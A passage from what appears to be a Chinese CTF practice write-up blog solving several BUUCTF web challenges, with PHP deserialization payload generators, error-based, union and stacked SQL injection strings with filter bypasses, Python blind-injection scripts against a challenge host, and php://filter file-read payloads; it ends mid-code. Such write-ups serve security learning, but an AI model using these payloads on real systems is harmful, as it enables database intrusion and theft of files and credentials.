</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Flag</span><span class="p">{</span>  <span class="c1">//flag.php  
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">public</span> <span class="nv">$file</span><span class="o">=</span><span class="s2">&#34;flag.php&#34;</span><span class="p">;</span>  
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__tostring</span><span class="p">(){</span>  
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">)){</span>  
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="s2">&#34;U R SO CLOSE !///COME ON PLZ&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>  
</span></span><span class="line"><span class="cl">    <span class="p">}</span>  
</span></span><span class="line"><span class="cl"><span class="p">}</span>  
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">Flag</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="24ÊûÅÂÆ¢Â§ßÊåëÊàò-2019hardsql">24„ÄÅ[ÊûÅÂÆ¢Â§ßÊåëÊàò 2019]HardSQL
</h2><p>Á©∫Ê†ºÂíå/**/Ë¢´ËøáÊª§‰∫ÜÔºåÁî®ÔºàÔºâÁªïËøáÔºåÁî®Êä•ÈîôÊ≥®ÂÖ•</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">username=1&#39;or(updatexml(1,concat(0x7e,database(),0x7e),1))#&amp;password=1
</span></span><span class="line"><span class="cl">username=1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database()))),0x7e),1))#&amp;password=1
</span></span><span class="line"><span class="cl">username=1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_schema)like(database()))),0x7e),1))#&amp;password=1
</span></span><span class="line"><span class="cl">username=1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)),0x7e),1))#&amp;password=1
</span></span></code></pre></td></tr></table>
</div>
</div><p>flagÊòæÁ§∫‰∏çÂÖ®ÔºåsubstringË¢´ËøáÊª§ÔºåÂè™ËÉΩÁî®leftÂíårightÊûÑÈÄ†</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">username=1&#39;or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))#&amp;password=1
</span></span></code></pre></td></tr></table>
</div>
</div><p>flag{8c32c5d2-2601-4575-b121-a16d5f8c0d2e}</p>
<h2 id="ÁΩëÈºéÊùØ-2020-ÈùíÈæôÁªÑareuserialz">[ÁΩëÈºéÊùØ 2020 ÈùíÈæôÁªÑ]AreUSerialz
</h2><p>‰∏§ÁßçËß£Ê≥ï</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">FileHandler</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$op</span><span class="o">=</span><span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$filename</span><span class="o">=</span><span class="s1">&#39;flag.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$content</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$o</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">FileHandler</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$o</span> <span class="o">=</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$o</span><span class="p">));</span><span class="c1">//Êúâ‰∏çÂèØÊâìÂç∞Â≠óÁ¨¶‰ΩÜÂèà‰∏çËÉΩ‰∏¢ÂºÉÔºåurlÁºñÁ†Å
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$o</span> <span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;%00&#39;</span><span class="p">,</span><span class="s1">&#39;\00&#39;</span><span class="p">,</span><span class="nv">$o</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="c1">//Âõ†‰∏∫Ê£ÄÊµãÂáΩÊï∞Ë¶ÅÊ±ÇÂ≠óÁ¨¶Âú®asciiÁ†Å32-125Ôºå‰ΩÜÊòØ%00‰∏çÂú®ËåÉÂõ¥ÂÜÖÔºåË¶ÅÊîπÊàê\00
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$o</span> <span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;s&#39;</span><span class="p">,</span><span class="s1">&#39;S&#39;</span><span class="p">,</span><span class="nv">$o</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="c1">//Êîπ‰∏∫\00ÂêéÔºåÂèçÂ∫èÂàóÂåñÂêé‰∏ç‰ºöËØÜÂà´\00ÔºåÂ∞èÂÜôsË°®Á§∫Â≠óÁ¨¶‰∏≤,Â§ßÂÜôSË°®Á§∫16ËøõÂà∂Â≠óÁ¨¶‰∏≤
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">echo</span> <span class="nv">$o</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Âà©Áî®ÂΩìPHPÁâàÊú¨ &gt;= 7.2 Êó∂ÔºåÂèçÂ∫èÂàóÂåñÂØπËÆøÈóÆÁ±ªÂà´‰∏çÊïèÊÑü„ÄÇ</p>
<p>Áõ¥Êé•Êîπ‰∏∫public,ËØªÂèñbase64ÁºñÁ†ÅÂêéÁöÑflag.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">FileHandler</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$op</span><span class="o">=</span><span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$filename</span><span class="o">=</span><span class="s1">&#39;php://filter/convert.base64-encode/resource=flag.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$content</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$o</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">FileHandler</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$o</span> <span class="o">=</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$o</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="gxyctf2019babysqli">[GXYCTF2019]BabySQli
</h2><p>exp</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#39; union select 1,&#39;admin&#39;, &#39; 202cb962ac59075b964b07152d234b70 &#39;#
</span></span><span class="line"><span class="cl">123
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ê∫êÁ†ÅËøôÈáåÊúâÊèêÁ§∫</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250208155008477.png"
	width="616"
	height="248"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250208155008477_hu2812369422127335082.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250208155008477_hu13273175668499928156.png 1024w"
	loading="lazy"
	
		alt="image-20250208155008477"
	
	
		class="gallery-image" 
		data-flex-grow="248"
		data-flex-basis="596px"
	
></p>
<p>ËÅîÂêàÊ≥®ÂÖ•ÔºåÁ¨¨‰∫å‰ΩçË¶ÅÂ°´adminÔºåÁ¨¨‰∏â‰ΩçÂ°´Âä†ÂØÜÂêéÁöÑpassword</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250208155137036.png"
	width="1392"
	height="267"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250208155137036_hu10957919541577316052.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250208155137036_hu5214047939770289616.png 1024w"
	loading="lazy"
	
		alt="image-20250208155137036"
	
	
		class="gallery-image" 
		data-flex-grow="521"
		data-flex-basis="1251px"
	
></p>
<h2 id="gyctf2020blacklist">[GYCTF2020]Blacklist
</h2><p>Â†ÜÂè†Ê≥®ÂÖ•</p>
<p>ÂçïÂºïÂè∑Èó≠Âêà</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#39;;show databases;#
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250208155750502.png"
	width="790"
	height="733"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250208155750502_hu2113050530420817183.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250208155750502_hu11956450240654594529.png 1024w"
	loading="lazy"
	
		alt="image-20250208155750502"
	
	
		class="gallery-image" 
		data-flex-grow="107"
		data-flex-basis="258px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#39;;show tables;#
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250208155816697.png"
	width="544"
	height="303"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250208155816697_hu3831021482718269588.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250208155816697_hu10878393866591906548.png 1024w"
	loading="lazy"
	
		alt="image-20250208155816697"
	
	
		class="gallery-image" 
		data-flex-grow="179"
		data-flex-basis="430px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#39;;show columns from FlagHere;#
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250208160224872.png"
	width="968"
	height="354"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250208160224872_hu8232206659628555880.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250208160224872_hu11976986575304260598.png 1024w"
	loading="lazy"
	
		alt="image-20250208160224872"
	
	
		class="gallery-image" 
		data-flex-grow="273"
		data-flex-basis="656px"
	
></p>
<p>ËøôÈáåÊÉ≥Áî®‰πãÂâçÁöÑrename,ÁºñÁ†ÅËΩ¨Êç¢ÈÉΩ‰∏çË°å</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250208160451361.png"
	width="1184"
	height="78"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250208160451361_hu4896993843042465530.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250208160451361_hu16601113639340429147.png 1024w"
	loading="lazy"
	
		alt="image-20250208160451361"
	
	
		class="gallery-image" 
		data-flex-grow="1517"
		data-flex-basis="3643px"
	
></p>
<p>Áî®handlerËØ≠Âè•</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">handler table_name open;handler table_name read first;handler table_name close;
</span></span><span class="line"><span class="cl">handler table_name open;handler table_name read next;handler table_name close;
</span></span><span class="line"><span class="cl">È¶ñÂÖàÊâìÂºÄÊï∞ÊçÆÂ∫ìÔºåÂºÄÂßãËØªÂÆÉÁ¨¨‰∏ÄË°åÊï∞ÊçÆÔºåËØªÂèñÊàêÂäüÂêéËøõË°åÂÖ≥Èó≠Êìç‰Ωú„ÄÇ
</span></span><span class="line"><span class="cl">È¶ñÂÖàÊâìÂºÄÊï∞ÊçÆÂ∫ìÔºåÂºÄÂßãÂæ™ÁéØËØªÂèñÔºåËØªÂèñÊàêÂäüÂêéËøõË°åÂÖ≥Èó≠Êìç‰Ωú„ÄÇ
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÊàñËÄÖÁõ¥Êé•Áî®‰πãÂâçÁöÑpayload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#39;;handler FlagHere open as a;handler a read next;#
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="ciscn2019-ÂçéÂåóËµõÂå∫-day2-web1hack-world">[CISCN2019 ÂçéÂåóËµõÂå∫ Day2 Web1]Hack World
</h2><p>sqlÊ≥®ÂÖ•Ôºå‰ΩÜÊòØËøáÊª§Á©∫Ê†ºÂíåËÅîÂêàÊ≥®ÂÖ•ÔºåÊä•ÈîôÊ≥®ÂÖ•ÔºåÁî®Áõ≤Ê≥®</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl"><span class="n">url</span><span class="o">=</span><span class="s1">&#39;http://1e88c184-cbcd-4755-bc2e-1122d382e665.node5.buuoj.cn:81/index.php&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">43</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="nb">max</span> <span class="o">=</span> <span class="mi">127</span>
</span></span><span class="line"><span class="cl">    <span class="nb">min</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">127</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span> <span class="o">=</span> <span class="p">(</span><span class="nb">int</span><span class="p">)((</span><span class="nb">max</span><span class="o">+</span><span class="nb">min</span><span class="p">)</span><span class="o">/</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;1^(ascii(substr((select(flag)from(flag)),&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;,1))&gt;&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;)&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;id&#39;</span><span class="p">:</span><span class="n">payload</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.005</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s1">&#39;Hello, glzjin wants a girlfriend.&#39;</span> <span class="ow">in</span> <span class="nb">str</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">content</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="nb">max</span><span class="o">=</span><span class="n">s</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">min</span><span class="o">=</span><span class="n">s</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">((</span><span class="nb">max</span><span class="o">-</span><span class="nb">min</span><span class="p">)</span><span class="o">&lt;=</span><span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">flag</span><span class="o">+=</span><span class="nb">chr</span><span class="p">(</span><span class="nb">max</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôÈáåÂõ†‰∏∫ÊòØorË¢´ËøáÊª§Áî®ÂºÇÊàñÁ¨¶Âè∑Êõø‰ª£</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">url</span><span class="o">=</span><span class="s1">&#39;http://1e88c184-cbcd-4755-bc2e-1122d382e665.node5.buuoj.cn:81/index.php&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">43</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="nb">max</span> <span class="o">=</span> <span class="mi">127</span>
</span></span><span class="line"><span class="cl">    <span class="nb">min</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">127</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">n</span> <span class="o">=</span> <span class="p">(</span><span class="nb">int</span><span class="p">)((</span><span class="nb">max</span><span class="o">+</span><span class="nb">min</span><span class="p">)</span><span class="o">/</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;0^(ascii(substr((select(flag)from(flag)),&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;,1))&gt;&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">n</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;)&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;id&#39;</span><span class="p">:</span><span class="n">payload</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.005</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s1">&#39;Hello&#39;</span> <span class="ow">in</span> <span class="nb">str</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">content</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="nb">min</span><span class="o">=</span><span class="n">n</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">max</span><span class="o">=</span><span class="n">n</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">((</span><span class="nb">max</span><span class="o">-</span><span class="nb">min</span><span class="p">)</span><span class="o">&lt;=</span><span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">flag</span><span class="o">+=</span><span class="nb">chr</span><span class="p">(</span><span class="nb">max</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\r</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span><span class="n">end</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="roarctf-2019easy-java">[RoarCTF 2019]Easy Java
</h2><p>ÁÇπhelpÔºåÂèëÁé∞Ê≤°‰ªÄ‰πàÁî®ÔºåÊäìÂåÖÊîπpost</p>
<p>‰∏ãËΩΩ‰∏ãÊù•Ê≤°Áî®ÔºåÁî±‰∫éÈ¢òÁõÆÂêçÁß∞ÊòØjavaÔºåÊÉ≥Âà∞‰∏ãËΩΩweb.xml</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250208204525222.png"
	width="1740"
	height="628"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250208204525222_hu12549401992983433739.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250208204525222_hu15083176488674186604.png 1024w"
	loading="lazy"
	
		alt="image-20250208204525222"
	
	
		class="gallery-image" 
		data-flex-grow="277"
		data-flex-basis="664px"
	
></p>
<p>‰∏ãËΩΩÂêéÈù¢Ëøô‰∏™classÁ±ª</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250208204630903.png"
	width="1875"
	height="689"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250208204630903_hu431797542549881681.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250208204630903_hu818399688517910433.png 1024w"
	loading="lazy"
	
		alt="image-20250208204630903"
	
	
		class="gallery-image" 
		data-flex-grow="272"
		data-flex-basis="653px"
	
></p>
<p>ÂèØ‰ª•‰∏ãËΩΩ‰∏ãÊù•ÂèçÁºñËØëÊàñËÄÖËøôÈáåÂ∞±Áõ¥Êé•Êúâbase64ÁºñÁ†ÅÁöÑÂ≠óÁ¨¶‰∏≤</p>
<h2 id="bsidescf-2020had-a-bad-day">[BSidesCF 2020]Had a bad day
</h2><p>ËøôÈ¢ò‰∏ªË¶ÅÊòØÁî®Âà∞php://filter‰º™ÂçèËÆÆÂèØ‰ª•Â•ó‰∏ÄÂ±ÇÂçèËÆÆ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">category=php://filter/convert.base64-encode/resource=index.php
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250209103207749.png"
	width="1668"
	height="708"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250209103207749_hu13587277136454511893.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250209103207749_hu13179770949394558293.png 1024w"
	loading="lazy"
	
		alt="image-20250209103207749"
	
	
		class="gallery-image" 
		data-flex-grow="235"
		data-flex-basis="565px"
	
></p>
<p>ÂèØ‰ª•ÁúãÂà∞Ëá™Âä®ÊãºÊé•‰∫ÜphpÂêéÁºÄ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">				<span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;category&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">				<span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span>
